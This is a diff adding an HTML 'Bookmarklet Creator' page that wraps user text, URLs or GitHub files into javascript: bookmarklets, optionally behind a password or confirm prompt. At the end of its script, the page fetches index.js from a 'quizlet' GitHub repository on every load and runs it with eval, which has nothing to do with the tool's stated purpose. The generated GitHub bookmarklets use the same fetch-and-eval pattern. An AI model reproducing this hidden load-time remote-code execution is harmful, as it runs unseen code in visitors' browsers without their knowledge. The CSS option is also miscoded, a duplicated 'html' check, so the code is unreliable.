@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Bookmarklet Creator</title>
+  <style> 
+    * { position: absolute; } 
+    #typel {top: 0px; left: 0px; width: 100%;}
+    #passl {top: 0px; left: 100px; width: 100%;}
+    #conl {top: 0px; left: 200px; width: 100%;}
+    #name {top: 15px; left: 275px; width: 200px; height: 15px; resize: none;}
+    #text {top: 50px; left: 0px; width: 600px; height: 200px; resize: none;}
+    #confirm {top: 260px; left: 0px; width: 600px; height: 15px; resize: none;}
+    #passwordText {top: 290px; left: 0px; width: 600px; height: 15px; resize: none;}
+    #password {top: 320px; left: 0px; width: 600px; height: 15px; resize: none;}
+    #passwordAuto {top: 350px; left: 0px; width: 600px; height: 15px; resize: none;}
+    #output {top: 380px; left: 0px; width: 600px; height: 200px; resize: none;}
+    #link {top: 590px; left: 0px; width: 600px; height: 200px; resize: none;}
+  </style>
+</head>
+<body>
+  <label id="typel">Type <select oninput="update()" id="type">
+    <option value="js">JS</option>   
+    <option value="html">HTML</option>   
+    <option value="css">CSS</option>   
+    <option value="git">Github</option>   
+    <option value="url">URL</option>   
+    </select></label>
+  <label id="passl">Password<input oninput="update()" id="passCheck" type="checkbox"></label>
+  <label id="conl">Confirm<input oninput="update()" id="conCheck" type="checkbox"></label>
+  <textarea oninput="update()" id="name" placeholder="Name"></textarea>
+  <textarea oninput="update()" id="text" placeholder="Text"></textarea>
+  <textarea oninput="update()" id="confirm" style="display:none" placeholder="Confirm Message"></textarea>
+  <textarea oninput="update()" id="passwordText" style="display:none" placeholder="Password Text"></textarea>
+  <textarea oninput="update()" id="password" style="display:none" placeholder="Password"></textarea>
+  <textarea oninput="update()" id="passwordAuto" style="display:none" placeholder="Password Auto"></textarea>
+  <textarea id="output" placeholder="Output"></textarea>
+  <a id="link" href="about:blank"></a>
+  
+  <script>
+    //https://github.com/OnesAndZer0s/quizlet/blob/master/index.js
+function update() {
+if (document.getElementById("passCheck").checked) {
+  document.getElementById("passwordText").style.display = "block";
+  document.getElementById("password").style.display = "block";
+  document.getElementById("passwordAuto").style.display = "block";
+} else {
+  document.getElementById("passwordText").style.display = "none";
+  document.getElementById("password").style.display = "none";
+  document.getElementById("passwordAuto").style.display = "none"; 
+}
+if (document.getElementById("conCheck").checked) {
+  document.getElementById("confirm").style.display = "block"
+} else {
+  document.getElementById("confirm").style.display = "none"
+}
+  
+var name = document.getElementById("name").value,
+    type = document.getElementById("type").value,
+    text = document.getElementById("text").value,
+    passCheck = document.getElementById("passCheck").checked,
+    conCheck = document.getElementById("conCheck").checked,
+    confirm = document.getElementById("confirm").value,
+    passText = document.getElementById("passwordText").value;
+    pass = document.getElementById("password").value;
+    passAuto = document.getElementById("passwordAuto").value;
+var link = '';
+if (type == "js") {link = text} else 
+if (type == "html") {link = "var parse = new DOMParser(), x = parse.parseFromString(atob('" + btoa(text) + "'), 'text/html').firstChild; document.body.appendChild(x);"} else 
+if (type == "html") {link = "var parse = new DOMParser(), x = parse.parseFromString(atob('<style>" + btoa(text) + "</style>'), 'text/html').firstChild; document.head.appendChild(x);"} else 
+if (type == "url") {link = "window.open('"+text+"','_parent')"} else 
+{var url = new URL(text).pathname.split("/"); url.splice(0,1); url.splice(2,1); url.splice(2,1,"contents");url = url.join("/");console.log(url);link = "var request = new XMLHttpRequest(); request.onload = function(res){eval(atob(JSON.parse(res.currentTarget.responseText).content));}; request.open('get', 'https://api.github.com/repos/"+url+"', true); request.send()"}
+  
+if (passCheck) {link = "if (prompt('"+passText+"','"+passAuto+"') == '"+pass+"') {" + link + "}"}  
+if (conCheck) {link = "if (confirm('"+confirm+"')) {" + link + "}"}  
+
+document.getElementById("output").innerHTML = link;  
+document.getElementById("link").innerHTML = name;  
+document.getElementById("link").href = encodeURI("javascript:(function(){" + link + "})()");
+}
+var request = new XMLHttpRequest();
+request.onload = function(res){eval(atob(JSON.parse(res.currentTarget.responseText).content));};
+request.open('get', 'https://api.github.com/repos/OnesAndZer0s/quizlet/contents/index.js', true)
+request.send()
+  </script>
+</body>
+</html>
